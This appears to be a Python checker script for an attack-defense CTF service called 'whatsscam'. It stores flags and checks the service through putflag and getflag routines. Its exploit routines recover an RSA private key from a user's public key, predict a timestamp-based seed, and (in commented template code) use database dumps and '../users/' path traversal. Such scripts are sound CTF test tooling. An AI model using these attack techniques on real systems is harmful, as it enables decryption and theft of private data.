from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
#import faker


from httpx import AsyncClient
from typing import Optional
from logging import LoggerAdapter
from bs4 import BeautifulSoup
import re
import datetime


import checker_util_func
import rsa




from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""
SERVICE_PORT = 9696
checker = Enochecker("whatsscam", 9696)
def app(): return checker.app


"""
CHECKER FUNCTIONS 0
"""
@checker.putflag(0)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    print("putflag hier start")
    #timeout = (5.0, 30.0)
    for i in range(0, 2):
        try:
            client = AsyncClient(
                    base_url=f"http://{task.address}:{SERVICE_PORT}",
                    #timeout=timeout
                )
            break
        except:
            raise MumbleException("Could not connect to service")
        
    start_time = datetime.datetime.now()
    
    success = True
    for i in range(0, 4):
        try:
            email_1, password1_1 = await checker_util_func.create_user(db, client, logger, public_key='on')
            print(i)
            print("create_user hier")
            break
        except:
            success = False

    if not success:
        raise MumbleException("Could not create user 1")
    

    print("dauer_publickey: ", datetime.datetime.now()-start_time)
    success = True
    for i in range(0, 4):
        try:
            await checker_util_func.logout(db, client, logger)
            print(i)
            print("logout hier")
            break
        except:
            success = False
    if not success:
        raise MumbleException("Could not logout")

    #print("hey2")
    start_time2 = datetime.datetime.now()
    success = True
    for i in range(0, 4):
        try:
            email_2, password1_2 = await checker_util_func.create_user(db, client, logger, public_key= None)
            print(i)
            print("create_user hier")
            break
        except:
            success = False

    if not success:
        raise MumbleException("Could not create user 2")
    print("dauer_no_publickey: ", datetime.datetime.now()-start_time2)

    #print("hey3")
    for i in range(0, 2):
        try:
            public_key = await checker_util_func.get_user_of_userlist(db, client, logger, email = email_1)
            break
        except:
            raise MumbleException("Could not get public key")


    #print("hey4")
    note = str(task.flag)
    target_email = email_1
    for i in range(0, 2):
        try:
            await checker_util_func.create_note(db ,client, logger, note, public_key)
            break
        except:
            raise MumbleException("Could not create note")
    for i in range(0, 2):
        try:
            await db.set("userdata", (email_2, password1_2))
            break
        except:
            raise MumbleException("Could not set userdata")

    end_time = datetime.datetime.now()
    print(" : ", end_time-start_time)
    print("putflag hier end")

    return email_1


@checker.getflag(0)
async def getflag_test(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    print("getflag hier start")
    #timeout = (5.0, 30.0)
    for i in range(0, 2):
        try:
            client = AsyncClient(
                    base_url=f"http://{task.address}:{SERVICE_PORT}",
                    #timeout=timeout
                )
            break
        except:
            raise MumbleException("Could not connect to service")
    start_time = datetime.datetime.now()

    for i in range(0, 2):
        try:
            email, password = await db.get("userdata")
            break
        except KeyError:
            raise MumbleException("Missing database entry from putflag")
    
    print("userdata dauer" , datetime.datetime.now()-start_time)
    for i in range(0, 2):
        try:
            await checker_util_func.login_user(db, client, logger, email, password)
            break
        except:
            raise MumbleException("Could not login user")
    print("login_user" , datetime.datetime.now()-start_time)
    for i in range(0, 2):
        try:
            await checker_util_func.get_note(db, client, logger, note = str(task.flag))
            print("get_note" , datetime.datetime.now()-start_time)
            break
        except:
            raise MumbleException("Could not get note")
    end_time = datetime.datetime.now()
    print("getflag hier end")
    print("Time taken getflag 0: ", end_time-start_time)



@checker.exploit(0)
async def exploit_test(
    task: ExploitCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
    searcher: FlagSearcher,
) -> None:
    #timeout = (5.0, 30.0)
    if "@example.com" in task.attack_info:
        print("attack_info is good")
    else:
        return None
        #raise MumbleException("attack_info has int")
     

    for i in range(0, 2):
        try:
            client = AsyncClient(
                    base_url=f"http://{task.address}:{SERVICE_PORT}",
                    #timeout=timeout
                )
            break
        except:
            raise MumbleException("Could not connect to service")
    start_time = datetime.datetime.now()

    print("attacke hier")
    print(task.attack_info)
    print(task.flag_hash)
    print(task.flag_regex)

    target_email = task.attack_info
    success = True
    for i in range(0, 4):
        try:
            email_attacker, password = await checker_util_func.create_user(db, client, logger, public_key= None)
            print(i)
            print("create_user hier")
            break
        except:
            success = False

    if not success:
        raise MumbleException("Could not create user 3")
        
    for i in range(0, 2):
        try:
            public_key = await checker_util_func.get_user_of_userlist(db, client, logger, email = target_email)
            break
        except:
            raise MumbleException("Could not get public key")
    
    print("public_key hier")
    print(public_key)
    for i in range(0, 2):
        try:
            public_key = checker_util_func.format_rsa_public_key(public_key)
            break
        except:
            raise MumbleException("Could not format public key")
    
    key = rsa.PublicKey.load_pkcs1(public_key.encode())
    for i in range(0, 2):
        try:
            private_key = checker_util_func.expprime(key)
            break
        except:
            raise MumbleException("Could not create private key")
    private_key = private_key.save_pkcs1().decode()
    print("private_key hier")
    print(private_key)

    for i in range(0, 2):
        try:
            get_all_notes = await client.get("/")
            break
        except:
            raise MumbleException("Could not get all notes")
    soup_html = BeautifulSoup(get_all_notes.text, "html.parser")
    li = soup_html.find_all("li")
    li = [x.text for x in li]
    li = [x.split(" ") for x in li]
    li = [x.strip() for sublist in li for x in sublist]
    li = [x for x in li if x != '']

    for i in range(0, 2):
        start_time11 = datetime.datetime.now()
        for i in li:
            try:
                decrypted_message = checker_util_func.decryption_of_message(i, private_key)
                print(decrypted_message)
                print("flagggg hier")
                if flag := searcher.search_flag(decrypted_message):
                    end_time = datetime.datetime.now()
                    print("Time taken exploit 0: ", end_time-start_time11)
                    return flag
            except:
                pass
    raise MumbleException("flag not found")
    

"""
CHECKER FUNCTIONS 1
"""

@checker.putflag(1)
async def putflag_test_1(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    try:
        email_1, password1_1 = await checker_util_func.create_user(db, client, logger, public_key=None)
    except:
        raise MumbleException("Could not create user 1")
    for i in range(0, 2):
        try:
            group_name, group_key, redirect_url = await checker_util_func.create_group(db, client, logger)
            break
        except:
            pass
    group_id = str(redirect_url).split('/')[-1]
    print(redirect_url)
    print("hier re")
    if "login?next=%2Fcreategroup" in group_id:
        print("group_id is bullshit")
        print(group_id)
    
    try:
        await checker_util_func.create_group_note(db, client, logger, note = task.flag, redirect_url = redirect_url)
    except:
        raise MumbleException("Could not create group note")
    try:
        await db.set("group_data", (group_name, group_key, group_id))
    except:
        raise MumbleException("Could not set group data")
    
    return group_id


@checker.getflag(1)
async def getflag_test_1(
    task: GetflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    try:
        group_name, group_key, group_id = await db.get("group_data")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    print("1")
    try:
        await checker_util_func.create_user(db, client, logger, public_key=None)
    except:
        raise MumbleException("Could not create user")
    print("2")
    try:
        await checker_util_func.join_group(db, client, logger, group_name, group_key, group_id)
    except:
        raise MumbleException("Could not join group")
    print("3")
    try:
        await checker_util_func.get_group_note(db, client, logger, group_name, group_key, group_id, note = task.flag)
    except:
        raise MumbleException("Could not get group note")

@checker.exploit(1)
async def exploit_test_1(
    task: ExploitCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
    searcher: FlagSearcher,
) -> None:
    if "@example.com" not in task.attack_info:
        print("attack_info is good")
    else:
        return None
    print("attacke hier")
    print(task.attack_info)
    print(task.flag_hash)
    print(task.flag_regex)

    target_email = task.attack_info
    try:
        email_attacker, password = await checker_util_func.create_user(db, client, logger, public_key= None)
    except:
        raise MumbleException("Could not create user 3")
    try:
        response = await checker_util_func.open_group_window(db, client, logger, task.attack_info)
    except:
        raise MumbleException("Could not open group window")
    
    print("response hier")
    print(response)

    soup_html = BeautifulSoup(response.text, "html.parser")
    li = soup_html.find_all("li")
    li = [x.text for x in li]
    li = [x.split(" ") for x in li]
    li = [x.strip() for sublist in li for x in sublist]
    li = [x for x in li if x != '']
    
    print("li hier")
    print(li)
    cipher = li[0]
    time = li[2]
    seed = str(int(time.split(":")[0]) + 2) + time.split(":")[1]
    try:
        flag = await checker_util_func.exploit2(db, client, logger, cipher, str(seed), searcher)
    except:
        raise MumbleException("Could not exploit")
    
    print("flag hier")
    return flag











    

    








    # # Log a message before any critical action that could raise an error.
    # logger.debug(f"Connecting to service")
    # welcome = await conn.reader.readuntil(b">")

    # # Register a new user
    # await conn.register_user(username, password)

    # # Now we need to login
    # await conn.login_user(username, password)

    # # Finally, we can post our note!
    # logger.debug(f"Sending command to set the flag")
    # conn.writer.write(f"set {task.flag}\n".encode())
    # await conn.writer.drain()
    # await conn.reader.readuntil(b"Note saved! ID is ")

    # try:
    #     # Try to retrieve the resulting noteId. Using rstrip() is hacky, you should probably want to use regular expressions or something more robust.
    #     noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
    # except Exception as ex:
    #     logger.debug(f"Failed to retrieve note: {ex}")
    #     raise MumbleException("Could not retrieve NoteId")

    # assert_equals(len(noteId) > 0, True, message="Empty noteId received")

    # logger.debug(f"Got noteId {noteId}")

    # # Exit!
    # logger.debug(f"Sending exit command")
    # conn.writer.write(f"exit\n".encode())
    # await conn.writer.drain()
    
    # Save the generated values for the associated getflag() call.
    #await db.set("userdata", (username, password, noteId))

    #return username

# @checker.getflag(0)
# async def getflag_note(
#     task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection
# ) -> None:
#     try:
#         username, password, noteId = await db.get("userdata")
#     except KeyError:
#         raise MumbleException("Missing database entry from putflag")

#     logger.debug(f"Connecting to the service")
#     await conn.reader.readuntil(b">")

#     # Let's login to the service
#     await conn.login_user(username, password)

#     # Let´s obtain our note.
#     logger.debug(f"Sending command to retrieve note: {noteId}")
#     conn.writer.write(f"get {noteId}\n".encode())
#     await conn.writer.drain()
#     note = await conn.reader.readuntil(b">")
#     assert_in(
#         task.flag.encode(), note, "Resulting flag was found to be incorrect"
#     )

#     # Exit!
#     logger.debug(f"Sending exit command")
#     conn.writer.write(f"exit\n".encode())
#     await conn.writer.drain()
        

# @checker.putnoise(0)
# async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
#     logger.debug(f"Connecting to the service")
#     welcome = await conn.reader.readuntil(b">")

#     # First we need to register a user. So let's create some random strings. (Your real checker should use some better usernames or so [i.e., use the "faker¨ lib])
#     username = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     password = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     randomNote = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=36)
#     )

#     # Register another user
#     await conn.register_user(username, password)

#     # Now we need to login
#     await conn.login_user(username, password)

#     # Finally, we can post our note!
#     logger.debug(f"Sending command to save a note")
#     conn.writer.write(f"set {randomNote}\n".encode())
#     await conn.writer.drain()
#     await conn.reader.readuntil(b"Note saved! ID is ")

#     try:
#         noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
#     except Exception as ex:
#         logger.debug(f"Failed to retrieve note: {ex}")
#         raise MumbleException("Could not retrieve NoteId")

#     assert_equals(len(noteId) > 0, True, message="Empty noteId received")

#     logger.debug(f"{noteId}")

#     # Exit!
#     logger.debug(f"Sending exit command")
#     conn.writer.write(f"exit\n".encode())
#     await conn.writer.drain()

#     await db.set("userdata", (username, password, noteId, randomNote))
        
# @checker.getnoise(0)
# async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
#     try:
#         (username, password, noteId, randomNote) = await db.get('userdata')
#     except:
#         raise MumbleException("Putnoise Failed!") 

#     logger.debug(f"Connecting to service")
#     welcome = await conn.reader.readuntil(b">")

#     # Let's login to the service
#     await conn.login_user(username, password)

#     # Let´s obtain our note.
#     logger.debug(f"Sending command to retrieve note: {noteId}")
#     conn.writer.write(f"get {noteId}\n".encode())
#     await conn.writer.drain()
#     data = await conn.reader.readuntil(b">")
#     if not randomNote.encode() in data:
#         raise MumbleException("Resulting flag was found to be incorrect")

#     # Exit!
#     logger.debug(f"Sending exit command")
#     conn.writer.write(f"exit\n".encode())
#     await conn.writer.drain()


# @checker.havoc(0)
# async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#     logger.debug(f"Connecting to service")
#     welcome = await conn.reader.readuntil(b">")

#     # In variant 0, we'll check if the help text is available
#     logger.debug(f"Sending help command")
#     conn.writer.write(f"help\n".encode())
#     await conn.writer.drain()
#     helpstr = await conn.reader.readuntil(b">")

#     for line in [
#         "This is a notebook service. Commands:",
#         "reg USER PW - Register new account",
#         "log USER PW - Login to account",
#         "set TEXT..... - Set a note",
#         "user  - List all users",
#         "list - List all notes",
#         "exit - Exit!",
#         "dump - Dump the database",
#         "get ID",
#     ]:
#         assert_in(line.encode(), helpstr, "Received incomplete response.")

# @checker.havoc(1)
# async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#     logger.debug(f"Connecting to service")
#     welcome = await conn.reader.readuntil(b">")

#     # In variant 1, we'll check if the `user` command still works.
#     username = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     password = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )

#     # Register and login a dummy user
#     await conn.register_user(username, password)
#     await conn.login_user(username, password)

#     logger.debug(f"Sending user command")
#     conn.writer.write(f"user\n".encode())
#     await conn.writer.drain()
#     ret = await conn.reader.readuntil(b">")
#     if not b"User 0: " in ret:
#         raise MumbleException("User command does not return any users")

#     if username:
#         assert_in(username.encode(), ret, "Flag username not in user output")

#     # conn.writer.close()
#     # await conn.writer.wait_closed()

# @checker.havoc(2)
# async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#     logger.debug(f"Connecting to service")
#     welcome = await conn.reader.readuntil(b">")

#     # In variant 2, we'll check if the `list` command still works.
#     username = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     password = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     randomNote = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=36)
#     )

#     # Register and login a dummy user
#     await conn.register_user(username, password)
#     await conn.login_user(username, password)

#     logger.debug(f"Sending command to save a note")
#     conn.writer.write(f"set {randomNote}\n".encode())
#     await conn.writer.drain()
#     await conn.reader.readuntil(b"Note saved! ID is ")

#     try:
#         noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
#     except Exception as ex:
#         logger.debug(f"Failed to retrieve note: {ex}")
#         raise MumbleException("Could not retrieve NoteId")

#     assert_equals(len(noteId) > 0, True, message="Empty noteId received")

#     logger.debug(f"{noteId}")

#     logger.debug(f"Sending list command")
#     conn.writer.write(f"list\n".encode())
#     await conn.writer.drain()

#     data = await conn.reader.readuntil(b">")
#     if not noteId.encode() in data:
#         raise MumbleException("List command does not work as intended")

# @checker.exploit(0)
# async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
#     welcome = await conn.reader.readuntil(b">")
#     conn.writer.write(b"dump\nexit\n")
#     await conn.writer.drain()
#     data = await conn.reader.read(-1)
#     if flag := searcher.search_flag(data):
#         return flag
#     raise MumbleException("flag not found")

# @checker.exploit(1)
# async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
#     welcome = await conn.reader.readuntil(b">")
#     conn.writer.write(b"user\n")
#     await conn.writer.drain()

#     # TODO: Use flag hints
#     user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
#     for user in user_list:
#         user_name = user.split()[-1]
#         conn.writer.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
#         await conn.writer.drain()
#         await conn.reader.readuntil(b">")  # successfully registered
#         await conn.reader.readuntil(b">")  # successfully logged in
#         notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
#         for note in notes_list:
#             note_id = note.split()[-1]
#             conn.writer.write(b"get %s\n" % note_id)
#             await conn.writer.drain()
#             data = await conn.reader.readuntil(b">")
#             if flag := searcher.search_flag(data):
#                 return flag
#     raise MumbleException("flag not found")

# @checker.exploit(2)
# async def exploit2(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
#     welcome = await conn.reader.readuntil(b">")
#     conn.writer.write(b"user\n")
#     await conn.writer.drain()

#     # TODO: Use flag hints?
#     user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
#     for user in user_list:
#         user_name = user.split()[-1]
#         conn.writer.write(b"reg ../users/%s foo\nlog %s foo\n list\n" % (user_name, user_name))
#         await conn.writer.drain()
#         await conn.reader.readuntil(b">")  # successfully registered
#         await conn.reader.readuntil(b">")  # successfully logged in
#         notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
#         for note in notes_list:
#             note_id = note.split()[-1]
#             conn.writer.write(b"get %s\n" % note_id)
#             await conn.writer.drain()
#             data = await conn.reader.readuntil(b">")
#             if flag := searcher.search_flag(data):
#                 return flag
#     raise MumbleException("flag not found")


if __name__ == "__main__":
    checker.run()